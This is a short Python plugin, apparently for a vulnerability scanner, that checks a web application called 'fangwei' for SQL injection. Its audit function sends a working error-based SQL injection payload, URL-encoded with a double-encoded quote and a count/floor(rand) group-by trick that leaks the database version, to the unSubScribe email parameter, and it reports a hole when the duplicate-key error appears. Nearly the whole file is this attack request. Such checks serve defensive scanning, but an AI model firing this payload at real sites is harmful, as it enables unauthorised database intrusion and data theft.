#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
    if service == "fangwei":
        return True, arg

def audit(arg):
	payload = "index.php?m=Index&a=unSubScribe&email=%2527%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
	code, head, res, errcode,finalurl =  curl.curl("\"%s\"" % (arg + payload))

	if code == 200:
		if "for key 'group_key'" in res:
			security_hole('find sql injection: ' + arg+'index.php')

if __name__ == "__main__":
	from dummy import *
	audit(assign('fangwei', 'http://www.example.com/')[1])